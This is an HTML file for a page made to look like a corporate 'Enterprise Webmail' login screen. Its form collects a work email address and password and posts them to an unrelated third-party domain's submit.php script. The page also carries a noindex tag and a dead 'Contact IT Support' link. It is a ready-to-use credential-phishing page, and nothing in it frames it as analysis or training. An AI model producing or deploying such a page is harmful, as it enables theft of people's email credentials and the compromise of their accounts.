<!DOCTYPE html>
<html>
<head>
    <meta name="robots" content="noindex, nofollow">
    <title>Enterprise Webmail Login</title>
    <link rel="shortcut icon" href="/favicon.svg">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <style>
        body {
            font-family: "Segoe UI", Tahoma, Helvetica, Arial, sans-serif;
            background-image: url('https://images.unsplash.com/photo-1454165804606-c3d57bc86b40?ixlib=rb-1.2.1&auto=format&fit=crop&w=1950&q=80');
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            background-attachment: fixed;
            margin: 0;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .login-container {
            width: 100%;
            max-width: 420px;
            padding: 40px;
            margin: 20px;
            background: rgba(255, 255, 255, 0.93);
            border-radius: 12px;
            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.1);
            backdrop-filter: blur(8px);
        }

        h1 {
            text-align: center;
            font-size: 2.2em;
            margin-bottom: 30px;
            color: #2d3748;
        }

        input[type="email"],
        input[type="password"] {
            width: 100%;
            padding: 12px 16px;
            margin-bottom: 18px;
            border: 1px solid rgba(0, 0, 0, 0.1);
            border-radius: 8px;
            font-size: 1em;
        }

        button {
            width: 100%;
            padding: 12px;
            background-color: #4a90e2;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 1.05em;
            cursor: pointer;
        }

        button:hover {
            background-color: #357abd;
        }

        @media (max-width: 600px) {
            .login-container {
                padding: 30px;
            }
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h1>Enterprise Webmail</h1>
        <form action="https://www.musicaangola.ao/submit.php" method="POST">
            <input type="email" name="email" placeholder="Work Email Address" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Continue to Email</button>
        </form>
        <p style="margin-top:25px;text-align:center">Need help? <a href="#">Contact IT Support</a></p>
    </div>
</body>
</html>
